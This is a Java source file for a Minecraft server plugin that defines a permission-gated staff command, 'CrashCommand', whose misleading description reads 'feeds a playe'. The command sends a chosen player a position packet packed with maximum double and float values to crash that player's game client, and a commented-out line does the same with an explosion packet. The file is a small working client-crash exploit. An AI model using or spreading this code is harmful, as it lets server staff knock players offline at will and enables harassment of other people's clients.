package lol.pots.core.command.staff;

import com.google.common.collect.Sets;

import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import lol.pots.core.util.command.annotation.Command;
import lol.pots.core.util.command.annotation.OptArg;
import lol.pots.core.util.command.annotation.Require;
import lol.pots.core.util.command.annotation.Sender;

import java.util.Collections;

public class CrashCommand {


    @Command(name = "", desc = "feeds a playe", usage = "[player]")
    @Require("breeze.crash")
    public void execute(@Sender CommandSender sender, @OptArg Player target) {
//        (((CraftPlayer) target).getHandle()).playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE,
//                Collections.emptyList(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));

        (((CraftPlayer) target).getHandle()).playerConnection.sendPacket(new PacketPlayOutPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE, Sets.newHashSet(PacketPlayOutPosition.EnumPlayerTeleportFlags.values())));
    }

//)

}
